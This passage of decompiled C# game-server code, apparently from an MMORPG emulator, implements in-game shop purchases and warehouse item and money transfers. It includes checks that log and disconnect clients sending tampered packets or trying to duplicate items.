FLD_MAGIC4 == 80000003 && yuanbao != 600L) && !(使用天数 == 7 && FLD_MAGIC2 == 0 && FLD_MAGIC3 == 0 && FLD_MAGIC4 == 80000003 && yuanbao != 850L) && !(使用天数 == 30 && FLD_MAGIC2 == 0 && FLD_MAGIC3 == 0 && FLD_MAGIC4 == 80000003 && yuanbao != 1200L) && !(使用天数 == 3 && FLD_MAGIC2 == 0 && FLD_MAGIC3 == 0 && FLD_MAGIC4 == 80000004 && yuanbao != 700L) && !(使用天数 == 7 && FLD_MAGIC2 == 0 && FLD_MAGIC3 == 0 && FLD_MAGIC4 == 80000004 && yuanbao != 1050L) && !(使用天数 == 30 && FLD_MAGIC2 == 0 && FLD_MAGIC3 == 0 && FLD_MAGIC4 == 80000004 && yuanbao != 1300L) && (!(使用天数 == 3 && FLD_MAGIC2 != 0 && FLD_MAGIC3 != 0) || !(FLD_MAGIC4 == 0 && yuanbao != 650L)) && !(使用天数 == 7 && FLD_MAGIC2 != 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 0 && yuanbao != 1000L) && !(使用天数 == 30 && FLD_MAGIC2 != 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 0 && yuanbao != 1250L) && !(使用天数 == 3 && FLD_MAGIC2 != 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 80000003 && yuanbao != 1150L) && !(使用天数 == 7 && FLD_MAGIC2 != 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 80000003 && yuanbao != 1500L) && !(使用天数 == 30 && FLD_MAGIC2 != 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 80000003 && yuanbao != 1750L) && !(使用天数 == 3 && FLD_MAGIC2 != 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 80000004 && yuanbao != 1250L) && !(使用天数 == 7 && FLD_MAGIC2 != 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 80000004 && yuanbao != 1600L) && !(使用天数 == 30 && FLD_MAGIC2 != 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 80000004 && yuanbao != 1850L) && !(使用天数 == 3 && FLD_MAGIC2 != 0 && FLD_MAGIC3 == 0 && FLD_MAGIC4 == 80000003 && yuanbao != 1100L) && !(使用天数 == 7 && FLD_MAGIC2 != 0 && FLD_MAGIC3 == 0 && FLD_MAGIC4 == 80000003 && yuanbao != 1450L) && !(使用天数 == 30 && FLD_MAGIC2 != 0 && FLD_MAGIC3 == 0 && FLD_MAGIC4 == 80000003 && yuanbao != 1700L) && !(使用天数 == 3 && FLD_MAGIC2 != 0 && FLD_MAGIC3 == 0 && FLD_MAGIC4 == 80000004 && yuanbao != 1200L) && !(使用天数 == 7 && FLD_MAGIC2 != 0 && FLD_MAGIC3 == 0 && FLD_MAGIC4 == 80000004 && yuanbao != 1550L) && !(使用天数 == 30 && FLD_MAGIC2 != 0 && FLD_MAGIC3 == 0 && FLD_MAGIC4 == 80000004 && yuanbao != 1800L) && !(使用天数 == 3 && FLD_MAGIC2 == 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 80000003 && yuanbao != 650L) && !(使用天数 == 7 && FLD_MAGIC2 == 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 80000003 && yuanbao != 1000L) && !(使用天数 == 30 && FLD_MAGIC2 == 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 80000003 && yuanbao != 1250L) && !(使用天数 == 3 && FLD_MAGIC2 == 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 80000004 && yuanbao != 750L) && !(使用天数 == 7 && FLD_MAGIC2 == 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 80000004 && yuanbao != 1100L) && !(使用天数 == 30 && FLD_MAGIC2 == 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 80000004 && yuanbao != 1350L))
					{
						int num = 得到包裹空位(this);
						if (num == -1)
						{
							return "没有空位了";
						}
						查百宝阁元宝数();
						if (类型 != 4)
						{
							if (yuanbao < 0L || base.FLD_RXPIONT < yuanbao)
							{
								return "元宝不够了";
							}
							检察元宝数据((int)yuanbao, 0);
							保存元宝数据();
						}
						else
						{
							if (yuanbao <= 0L || base.FLD_RXPIONTX < yuanbao)
							{
								return "积分不够了";
							}
							检察元宝积分数据((int)yuanbao, 0);
							保存元宝数据();
						}
						增加物品带属性(物品ID, num, 1, FLD_MAGIC0, FLD_MAGIC1, FLD_MAGIC2, FLD_MAGIC3, FLD_MAGIC4, 觉醒, 中级魂, 进化, 绑定, 使用天数);
						RxjhClass.百宝记录(base.Userid, base.UserName, 物品ID, 物品ID.ToString(), 物品数量, (int)yuanbao);
						return "购买成功";
					}
					return "购买错误2";
				}
				return "购买错误3";
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "百宝阁买卖东西  出错  [" + base.Userid + "][" + base.UserName + "]  " + ex.Message);
				return "购买错误5";
			}
		}

		public string 百宝阁买卖东西(int 物品ID, int 物品数量, int yuanbao, int 类型, int FLD_MAGIC0, int FLD_MAGIC1, int FLD_MAGIC2, int FLD_MAGIC3, int FLD_MAGIC4, int 中级魂, int 觉醒, int 进化, int 绑定, int 使用天数)
		{
			try
			{
				百宝阁类 value;
				if (!World.百宝阁属性物品类list.TryGetValue(物品ID, out value))
				{
					return "购买错误";
				}
				if (value.PID != 物品ID)
				{
					Form1.WriteLine(77, "非法修改封包封号5_百宝阁买卖东西[" + base.Userid + "][" + base.UserName + "]  人物全服ID=[" + base.人物全服ID + "]  [" + base.Client.ToString() + "]");
					if (base.Client != null)
					{
						base.Client.Dispose();
					}
					return "你已经被封号请联系管理";
				}
				if (value.TYPE != 类型)
				{
					Form1.WriteLine(77, "非法修改封包封号3_百宝阁买卖东西[" + base.Userid + "][" + base.UserName + "]  人物全服ID=[" + base.人物全服ID + "]  [" + base.Client.ToString() + "]");
					if (base.Client != null)
					{
						base.Client.Dispose();
					}
					return "你已经被封号请联系管理";
				}
				if (物品数量 == 1)
				{
					if (yuanbao != value.PRICE)
					{
						Form1.WriteLine(77, "非法修改封包封号2_百宝阁买卖东西[" + base.Userid + "][" + base.UserName + "]  人物全服ID=[" + base.人物全服ID + "]  [" + base.Client.ToString() + "]");
						if (base.Client != null)
						{
							base.Client.Dispose();
						}
						return "购买错误";
					}
				}
				else if (yuanbao != value.PRICE * 物品数量)
				{
					Form1.WriteLine(77, "非法修改封包封号3_百宝阁买卖东西[" + base.Userid + "][" + base.UserName + "]  人物全服ID=[" + base.人物全服ID + "]  [" + base.Client.ToString() + "]");
					if (base.Client != null)
					{
						base.Client.Dispose();
					}
					return "购买错误";
				}
				if (物品数量 >= 1 && yuanbao >= 0)
				{
					int num = 得到包裹空位(this);
					int num2 = 物品ID;
					if (num == -1)
					{
						return "没有空位了";
					}
					查百宝阁元宝数();
					if (物品数量 >= 1 && yuanbao > 0 && base.FLD_RXPIONT >= yuanbao)
					{
						检察元宝数据(yuanbao, 0);
						switch (num2)
						{
						case 800000012:
							FLD_MAGIC0 = RNG.Next(200002, 200010);
							break;
						case 800000011:
							FLD_MAGIC0 = RNG.Next(100002, 100010);
							break;
						case 800000046:
							FLD_MAGIC0 = RNG.Next(1, 22);
							break;
						case 800000047:
							FLD_MAGIC0 = RNG.Next(23, 51);
							break;
						case 800000048:
							FLD_MAGIC0 = RNG.Next(70, 81);
							break;
						case 800000025:
							FLD_MAGIC0 = RNG.Next(1000002, 1000010);
							break;
						case 800000026:
							FLD_MAGIC0 = RNG.Next(700002, 700010);
							break;
						case 800000027:
							FLD_MAGIC0 = int.Parse("200" + RNG.Next(0, 6) + "000");
							break;
						}
						if (物品数量 > 1)
						{
							for (int i = 0; i < 物品数量; i++)
							{
								int 位置 = 得到包裹空位(this);
								switch (num2)
								{
								case 800000012:
									FLD_MAGIC0 = RNG.Next(200002, 200010);
									break;
								case 800000011:
									FLD_MAGIC0 = RNG.Next(100002, 100010);
									break;
								case 800000046:
									FLD_MAGIC0 = RNG.Next(1, 22);
									break;
								case 800000047:
									FLD_MAGIC0 = RNG.Next(23, 51);
									break;
								case 800000048:
									FLD_MAGIC0 = RNG.Next(70, 81);
									break;
								case 800000025:
									FLD_MAGIC0 = RNG.Next(1000002, 1000010);
									break;
								case 800000026:
									FLD_MAGIC0 = RNG.Next(700002, 700010);
									break;
								case 800000027:
									FLD_MAGIC0 = int.Parse("200" + RNG.Next(0, 6) + "000");
									break;
								}
								增加物品带属性(物品ID, 位置, 1, FLD_MAGIC0, FLD_MAGIC1, FLD_MAGIC2, FLD_MAGIC3, FLD_MAGIC4, 觉醒, 中级魂, 进化, 绑定, 使用天数);
							}
						}
						else
						{
							增加物品带属性(物品ID, num, 1, FLD_MAGIC0, FLD_MAGIC1, FLD_MAGIC2, FLD_MAGIC3, FLD_MAGIC4, 觉醒, 中级魂, 进化, 绑定, 使用天数);
						}
						if (yuanbao > 0)
						{
							RxjhClass.百宝记录(base.Userid, base.UserName, 物品ID, 物品ID.ToString(), 物品数量, yuanbao);
						}
						保存元宝数据();
						return "购买成功";
					}
					return "元宝不够了";
				}
				return "购买错误";
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "百宝阁买卖东西  出错  [" + base.Userid + "][" + base.UserName + "]  " + ex.Message);
				return "购买错误";
			}
		}

		public int 得到个人仓库空位(int iii)
		{
			int num = 0;
			while (true)
			{
				if (num < 60)
				{
					if (iii == 3)
					{
						if (Buffer.ToInt32(个人仓库[num].物品ID, 0) == 0)
						{
							return num;
						}
					}
					else if (Buffer.ToInt32(公共仓库[num].物品ID, 0) == 0)
					{
						break;
					}
					num++;
					continue;
				}
				return -1;
			}
			return num;
		}

		public void 仓库存取(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				int num;
				int num2;
				int 物品ID;
				int num3;
				long num4;
				if (交易 == null || !交易.交易中)
				{
					if (!打开仓库中)
					{
						Form1.WriteLine(6, "仓库存取  BUG![" + base.Userid + "]-[" + base.UserName + "]");
					}
					else if (!进店中 && !退出中 && !base.Player死亡)
					{
						byte[] array = new byte[4];
						byte[] dst = new byte[8];
						byte[] array2 = new byte[8];
						byte[] array3 = new byte[4];
						byte[] array4 = new byte[4];
						num = 100;
						byte[] array5 = new byte[2];
						System.Buffer.BlockCopy(封包数据, 8, array5, 0, 2);
						if (BitConverter.ToInt16(array5, 0) <= 108)
						{
							System.Buffer.BlockCopy(封包数据, 10, array4, 0, 2);
							System.Buffer.BlockCopy(封包数据, 18, array, 0, 4);
							System.Buffer.BlockCopy(封包数据, 22, array2, 0, 8);
							System.Buffer.BlockCopy(封包数据, 34, dst, 0, 8);
							System.Buffer.BlockCopy(封包数据, 55, array3, 0, 1);
						}
						else
						{
							System.Buffer.BlockCopy(封包数据, 14, array4, 0, 2);
							System.Buffer.BlockCopy(封包数据, 22, array, 0, 4);
							System.Buffer.BlockCopy(封包数据, 30, array2, 0, 8);
							System.Buffer.BlockCopy(封包数据, 46, dst, 0, 8);
							System.Buffer.BlockCopy(封包数据, 71, array3, 0, 1);
						}
						num2 = BitConverter.ToInt32(array4, 0);
						物品ID = BitConverter.ToInt32(array, 0);
						num3 = BitConverter.ToInt32(array3, 0);
						num4 = BitConverter.ToInt64(array2, 0);
						if (num4 < 1L)
						{
							Form1.WriteLine(5, "非法复制_仓库存取[" + base.Userid + "]-[" + base.UserName + "]___[" + num2 + "]___[" + 物品ID + "]___[" + num3 + "]___[" + num4 + "]");
							goto IL_03ea;
						}
						if ((uint)(num2 - 5) > 1u)
						{
							goto IL_02cd;
						}
						num = ((base.人物善恶 <= -1 && base.人物善恶 > -500) ? (num + num * 2) : ((base.人物善恶 <= -500 && base.人物善恶 > -5000) ? (num + num * 4) : ((base.人物善恶 <= -5000 && base.人物善恶 > -10000) ? (num * 8) : ((base.人物善恶 > -10000 || base.人物善恶 <= -30000) ? num : (num * 16)))));
						if (base.Player_Money >= num)
						{
							base.Player_Money -= num;
							更新金钱和负重();
							goto IL_02cd;
						}
						购买物品提示(13);
					}
				}
				goto end_IL_0000;
				IL_03ea:
				保存人物的数据();
				goto end_IL_0000;
				IL_02cd:
				switch (num2)
				{
				case 3:
				{
					int num7 = 得到个人仓库空位(3);
					if (num7 != -1)
					{
						仓库_装备栏减物品(物品ID, num3, num4, num7, 3);
					}
					else
					{
						购买物品提示(14);
					}
					break;
				}
				case 4:
					if (装备栏包裹[num3].物品绑定)
					{
						byte[] array6 = Converter.hexStringToByte("AA5556000A0093004800040000000A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000077A755AA");
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array6, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array6, array6.Length);
						}
					}
					else
					{
						int num6 = 得到个人仓库空位(4);
						if (num6 != -1)
						{
							仓库_装备栏减物品(物品ID, num3, num4, num6, 4);
						}
						else
						{
							购买物品提示(14);
						}
					}
					break;
				case 5:
				{
					int num8 = 得到包裹空位(this);
					if (num8 != -1)
					{
						仓库_装备栏加物品(物品ID, num3, num4, num8, 5, num);
					}
					else
					{
						购买物品提示(14);
					}
					break;
				}
				case 6:
				{
					int num5 = 得到包裹空位(this);
					if (num5 != -1)
					{
						仓库_装备栏加物品(物品ID, num3, num4, num5, 6, num);
					}
					else
					{
						购买物品提示(14);
					}
					break;
				}
				}
				goto IL_03ea;
				end_IL_0000:;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "仓库存取  出错  [" + base.Userid + "][" + base.UserName + "]  " + ex.Message);
			}
		}

		public void 仓库_装备栏加减钱数(int 物品ID, long 数量, int cklx, int 仓库类型)
		{
			byte[] array = Converter.hexStringToByte("AA558600560395007800030000000300000000943577000000006E00000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000E76C55AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(仓库类型), 0, array, 10, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(仓库类型), 0, array, 14, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array, 26, 8);
			System.Buffer.BlockCopy(BitConverter.GetBytes(物品ID), 0, array, 18, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(物品ID), 0, array, 50, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 仓库包物品操作(int 包ID, int 操作类型, int 物品ID, long 物品数量, 物品类 物品, int 位置, int 费用)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(操作类型);
			发包类.Write4(操作类型);
			发包类.Write8(物品ID);
			发包类.Write8(物品数量);
			发包类.Write8(费用);
			发包类.Write(物品.Get物品全局ID);
			发包类.Write(物品.Get物品ID);
			发包类.Write8(物品.Get物品数量);
			发包类.Write(1);
			发包类.Write(位置);
			发包类.Write(0);
			发包类.Write(3);
			发包类.Write4(1);
			发包类.Write4(物品.FLD_MAGIC0);
			发包类.Write4(物品.FLD_MAGIC1);
			发包类.Write4(物品.FLD_MAGIC2);
			发包类.Write4(物品.FLD_MAGIC3);
			发包类.Write4(物品.FLD_MAGIC4);
			发包类.Write2(物品.FLD_FJ_MAGIC0);
			发包类.Write2(物品.FLD_FJ_MAGIC1);
			发包类.Write2(物品.FLD_FJ_中级附魂);
			发包类.Write2(物品.FLD_FJ_MAGIC2);
			发包类.Write2(物品.FLD_FJ_MAGIC3);
			发包类.Write2(物品.FLD_FJ_MAGIC4);
			发包类.Write2(物品.FLD_FJ_MAGIC5);
			发包类.Write2(0);
			发包类.Write4(物品.FLD_KSSJ);
			发包类.Write4(物品.FLD_JSSJ);
			发包类.Write2(物品.FLD_FJ_NJ);
			发包类.Write4(物品.FLD_FJ_觉醒);
			发包类.Write2(0);
			发包类.Write2(物品.FLD_FJ_进化);
			发包类.Write2(0);
			发包类.Write4(物品.FLD_FJ_四神之力);
			发包类.Write4(0);
			发包类.Write4(0);
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 包ID, base.人物全服ID);
			}
		}

		public void 仓库_装备栏加物品(int 物品ID, int 位置, long 数量, int 包位置, int 仓库类型, int 费用)
		{
			int num = 0;
			int num2 = 0;
			try
			{
				if (物品ID == 2000000000)
				{
					if (base.Player_Money + 数量 > 9999999900L)
					{
						return;
					}
					if (仓库类型 == 5)
					{
						if (base.个人仓库钱数 < 数量)
						{
							Form1.WriteLine(6, "非法复制_仓库存取_取仓库1[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "]___[" + 物品ID + "]___[" + 位置 + "]___[" + 数量 + "]");
							return;
						}
						base.Player_Money += 数量;
						base.个人仓库钱数 -= 数量;
						仓库_装备栏加减钱数(物品ID, base.个人仓库钱数, 149, 仓库类型);
					}
					else
					{
						if (base.综合仓库钱数 < 数量)
						{
							Form1.WriteLine(6, "非法复制_仓库存取_取仓库2[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "]___[" + 物品ID + "]___[" + 位置 + "]___[" + 数量 + "]");
							return;
						}
						base.Player_Money += 数量;
						base.综合仓库钱数 -= 数量;
						仓库_装备栏加减钱数(物品ID, base.综合仓库钱数, 149, 仓库类型);
					}
				}
				else
				{
					if (数量 < 1L || 数量 > 9999L)
					{
						return;
					}
					物品类 物品类;
					if (仓库类型 == 5)
					{
						物品类 = 个人仓库[位置];
						for (int i = 0; i < 60; i++)
						{
							if (BitConverter.ToInt32(个人仓库[i].物品数量, 0) > 0 || BitConverter.ToInt32(个人仓库[i].物品ID, 0) != 0)
							{
								num++;
							}
						}
					}
					else
					{
						物品类 = 公共仓库[位置];
						for (int j = 0; j < 60; j++)
						{
							if (BitConverter.ToInt32(公共仓库[j].物品数量, 0) > 0 || BitConverter.ToInt32(公共仓库[j].物品ID, 0) != 0)
							{
								num++;
							}
						}
					}
					for (int k = 0; k < 66; k++)
					{
						if (BitConverter.ToInt32(装备栏包裹[k].物品数量, 0) > 0 || BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) != 0)
						{
							num2++;
						}
					}
					ItmeClass value;
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(物品类.物品ID, 0), out value) && !物品类.物品绑定)
					{
						return;
					}
					int fLD_SIDE = value.FLD_SIDE;
					if (fLD_SIDE == 0 && 数量 > 1L)
					{
						Form1.WriteLine(6, "非法复制_仓库存取_取仓库3[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "]  物品名称[" + 物品类.得到物品名称() + "]  物品数量[" + BitConverter.ToInt32(物品类.物品数量, 0) + "]  数量[" + 数量 + "]");
						if (仓库类型 == 5)
						{
							个人仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
						}
						else
						{
							公共仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
						}
						return;
					}
					if (BitConverter.ToInt32(物品类.物品数量, 0) < 数量)
					{
						if (仓库类型 == 5)
						{
							个人仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
						}
						else
						{
							公共仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
						}
						Form1.WriteLine(6, "非法复制_仓库存取_取仓库4[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "]  物品名称[" + 物品类.得到物品名称() + "]  物品数量[" + BitConverter.ToInt32(物品类.物品数量, 0) + "]  数量[" + 数量 + "]");
						return;
					}
					if (fLD_SIDE == 0)
					{
						数量 = 1L;
						if (BitConverter.ToInt32(物品类.物品数量, 0) != 1L)
						{
							return;
						}
						if (物品类.物品总重量 + base.人物当前负重 >= base.人物负重总)
						{
							购买物品提示(11);
							return;
						}
						if (物品ID != 物品类.Get物品ID && !物品类.物品绑定)
						{
							return;
						}
						base.人物当前负重 += 物品类.物品总重量;
						byte[] array = new byte[World.数据库单个物品大小];
						byte[] 物品全局ID = 物品类.物品全局ID;
						System.Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array, 12, 4);
						byte[] dst = array;
						System.Buffer.BlockCopy(物品全局ID, 0, dst, 0, 8);
						System.Buffer.BlockCopy(物品类.物品ID, 0, array, 8, 4);
						System.Buffer.BlockCopy(物品类.物品属性, 0, array, 16, World.物品属性大小);
						System.Buffer.BlockCopy(物品类.物品_byte, 72, array, 72, 1);
						装备栏包裹[包位置].物品_byte = array;
						仓库包物品操作(37632, 仓库类型, 物品ID, 数量, 装备栏包裹[包位置], 包位置, 费用);
						if (仓库类型 == 5)
						{
							if (个人仓库[位置].物品绑定)
							{
								物品ID -= 20000;
							}
							仓库包物品操作(38144, 仓库类型, 物品ID, 0L, 个人仓库[位置], 位置, 费用);
							个人仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
						}
						else
						{
							仓库包物品操作(38144, 仓库类型, 物品ID, 0L, 公共仓库[位置], 位置, 费用);
							公共仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
						}
					}
					else if (BitConverter.ToInt32(物品类.物品数量, 0) >= 数量)
					{
						byte[] array2 = new byte[World.数据库单个物品大小];
						物品类 物品类2 = 得到人物物品类型(BitConverter.ToInt32(物品类.物品ID, 0), 物品类.FLD_MAGIC0);
						byte[] src;
						if (物品类2 != null)
						{
							if (BitConverter.ToInt32(物品类.物品ID, 0) != 1008000044 && BitConverter.ToInt32(物品类.物品ID, 0) != 1008000045)
							{
								src = 物品类2.物品全局ID;
								包位置 = 物品类2.物品位置;
								System.Buffer.BlockCopy(BitConverter.GetBytes(数量 + BitConverter.ToInt32(物品类2.物品数量, 0)), 0, array2, 12, 4);
							}
							else
							{
								src = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
								BitConverter.GetBytes(数量);
								System.Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array2, 12, 4);
							}
						}
						else
						{
							BitConverter.GetBytes(数量);
							src = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
							System.Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array2, 12, 4);
						}
						System.Buffer.BlockCopy(src, 0, array2, 0, 8);
						System.Buffer.BlockCopy(物品类.物品ID, 0, array2, 8, 4);
						System.Buffer.BlockCopy(物品类.物品属性, 0, array2, 16, World.物品属性大小);
						System.Buffer.BlockCopy(物品类.物品_byte, 72, array2, 72, 1);
						if (物品类.物品单个重量 * 数量 + base.人物当前负重 >= base.人物负重总)
						{
							购买物品提示(11);
							return;
						}
						装备栏包裹[包位置].物品_byte = array2;
						int num3 = BitConverter.ToInt32(物品类.物品数量, 0) - (int)数量;
						仓库包物品操作(37632, 仓库类型, 物品ID, 数量, 装备栏包裹[包位置], 包位置, 费用);
						if (仓库类型 == 5)
						{
							if (num3 <= 0)
							{
								仓库包物品操作(38144, 仓库类型, 物品ID, 0L, 个人仓库[位置], 位置, 费用);
								个人仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							}
							else
							{
								个人仓库[位置].物品数量 = BitConverter.GetBytes(num3);
								仓库包物品操作(38144, 仓库类型, 物品ID, num3, 个人仓库[位置], 位置, 费用);
							}
						}
						else if (num3 <= 0)
						{
							仓库包物品操作(38144, 仓库类型, 物品ID, 0L, 公共仓库[位置], 位置, 费用);
							公共仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
						}
						else
						{
							公共仓库[位置].物品数量 = BitConverter.GetBytes(num3);
							仓库包物品操作(38144, 仓库类型, 物品ID, num3, 公共仓库[位置], 位置, 费用);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "仓库_装备栏加物品  出错  [" + base.Userid + "][" + base.UserName + "]位置[" + 位置 + "]数量[" + 数量 + "]包位置[" + 包位置 + "]仓库类型[" + 仓库类型 + "]  " + ex.Message);
			}
			更新金钱和负重();
		}

		public void 仓库_装备栏减物品(int 物品ID, int 位置, long 数量, int 仓库位置, int 仓库类型)
		{
			int num = 0;
			int num2 = 0;
			try
			{
				if (物品ID == 2000000000)
				{
					if (base.Player_Money < 数量)
					{
						Form1.WriteLine(6, "非法复制_仓库存取_放东西到仓库1[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "]___[" + 物品ID + "]___[" + 位置 + "]___[" + 数量 + "]");
						return;
					}
					base.Player_Money -= 数量;
					if (仓库类型 == 3)
					{
						base.个人仓库钱数 += 数量;
						仓库_装备栏加减钱数(物品ID, base.个人仓库钱数, 149, 仓库类型);
					}
					else
					{
						base.综合仓库钱数 += 数量;
						仓库_装备栏加减钱数(物品ID, base.综合仓库钱数, 149, 仓库类型);
					}
				}
				else
				{
					if (数量 < 1L || 装备栏包裹[位置].锁定)
					{
						return;
					}
					物品类 物品类 = 装备栏包裹[位置];
					ItmeClass value;
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(物品类.物品ID, 0), out value))
					{
						return;
					}
					if (value.FLD_LOCK == 1)
					{
						系统提示("锁定的物品无法保存到仓库。");
						return;
					}
					int fLD_SIDE = value.FLD_SIDE;
					for (int i = 0; i < 66; i++)
					{
						if (BitConverter.ToInt32(装备栏包裹[i].物品数量, 0) > 0 || BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) != 0)
						{
							num++;
						}
					}
					if (仓库类型 == 3)
					{
						for (int j = 0; j < 60; j++)
						{
							if (BitConverter.ToInt32(个人仓库[j].物品数量, 0) > 0 || BitConverter.ToInt32(个人仓库[j].物品ID, 0) != 0)
							{
								num2++;
							}
						}
					}
					else
					{
						for (int k = 0; k < 60; k++)
						{
							if (BitConverter.ToInt32(公共仓库[k].物品数量, 0) > 0 || BitConverter.ToInt32(公共仓库[k].物品ID, 0) != 0)
							{
								num2++;
							}
						}
					}
					if (fLD_SIDE == 0)
					{
						if (数量 > 1L)
						{
							Form1.WriteLine(6, "非法复制_仓库存取_放东西到仓库3[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "]  物品名称[" + 物品类.得到物品名称() + "]  物品数量[" + BitConverter.ToInt32(物品类.物品数量, 0) + "]  数量[" + 数量 + "]");
							减去物品(位置, BitConverter.ToInt32(物品类.物品数量, 0));
							return;
						}
						if (BitConverter.ToInt32(物品类.物品数量, 0) == 数量)
						{
							base.人物当前负重 -= 物品类.物品总重量;
							byte[] array = new byte[World.数据库单个物品大小];
							byte[] 物品全局ID = 物品类.物品全局ID;
							System.Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array, 12, 4);
							byte[] dst = array;
							System.Buffer.BlockCopy(物品全局ID, 0, dst, 0, 8);
							System.Buffer.BlockCopy(物品类.物品ID, 0, array, 8, 4);
							System.Buffer.BlockCopy(物品类.物品属性, 0, array, 16, World.物品属性大小);
							System.Buffer.BlockCopy(物品类.物品_byte, 72, array, 72, 1);
							仓库包物品操作(37632, 仓库类型, 物品ID, 数量, 装备栏包裹[位置], 位置, 0);
							if (仓库类型 == 3)
							{
								个人仓库[仓库位置].物品_byte = array;
								仓库包物品操作(38144, 仓库类型, 物品ID, 数量, 个人仓库[仓库位置], 仓库位置, 0);
							}
							else
							{
								公共仓库[仓库位置].物品_byte = array;
								仓库包物品操作(38144, 仓库类型, 物品ID, 数量, 公共仓库[仓库位置], 仓库位置, 0);
							}
							装备栏包裹[位置].物品_byte = new byte[World.数据库单个物品大小];
						}
						else
						{
							减去物品(位置, BitConverter.ToInt32(物品类.物品数量, 0));
						}
					}
					else
					{
						if (BitConverter.ToInt32(物品类.物品数量, 0) < 数量)
						{
							Form1.WriteLine(6, "非法复制_仓库存取_放东西到仓库2[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "]  物品名称[" + 物品类.得到物品名称() + "]  物品数量[" + BitConverter.ToInt32(物品类.物品数量, 0) + "]  数量[" + 数量 + "]");
							return;
						}
						int num3 = BitConverter.ToInt32(物品类.物品数量, 0) - (int)数量;
						base.人物当前负重 -= 物品类.物品总重量;
						byte[] array2 = new byte[World.数据库单个物品大小];
						物品类 物品类2 = 得到人物公共仓库类型(BitConverter.ToInt32(物品类.物品ID, 0), 仓库类型, 物品类.FLD_MAGIC0);
						byte[] src;
						if (物品类2 != null)
						{
							if (BitConverter.ToInt32(物品类.物品ID, 0) != 1008000044 && BitConverter.ToInt32(物品类.物品ID, 0) != 1008000045)
							{
								src = 物品类2.物品全局ID;
								仓库位置 = 物品类2.物品位置;
								System.Buffer.BlockCopy(BitConverter.GetBytes(数量 + BitConverter.ToInt32(物品类2.物品数量, 0)), 0, array2, 12, 4);
							}
							else
							{
								src = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
								BitConverter.GetBytes(数量);
								System.Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array2, 12, 4);
							}
						}
						else
						{
							BitConverter.GetBytes(数量);
							src = ((num3 > 0) ? BitConverter.GetBytes(RxjhClass.GetDBItmeId()) : 物品类.物品全局ID);
							System.Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array2, 12, 4);
						}
						System.Buffer.BlockCopy(src, 0, array2, 0, 8);
						System.Buffer.BlockCopy(物品类.物品ID, 0, array2, 8, 4);
						System.Buffer.BlockCopy(物品类.物品属性, 0, array2, 16, World.物品属性大小);
						System.Buffer.BlockCopy(物品类.物品_byte, 72, array2, 72, 1);
						if (num3 <= 0)
						{
							装备栏包裹[位置].物品_byte = new byte[World.数据库单个物品大小];
							仓库包物品操作(37632, 仓库类型, 物品ID, 数量, 装备栏包裹[位置], 位置, 0);
						}
						else
						{
							装备栏包裹[位置].物品数量 = BitConverter.GetBytes(num3);
							仓库包物品操作(37632, 仓库类型, 物品ID, 数量, 装备栏包裹[位置], 位置, 0);
						}
						if (仓库类型 == 3)
						{
							个人仓库[仓库位置].物品_byte = array2;
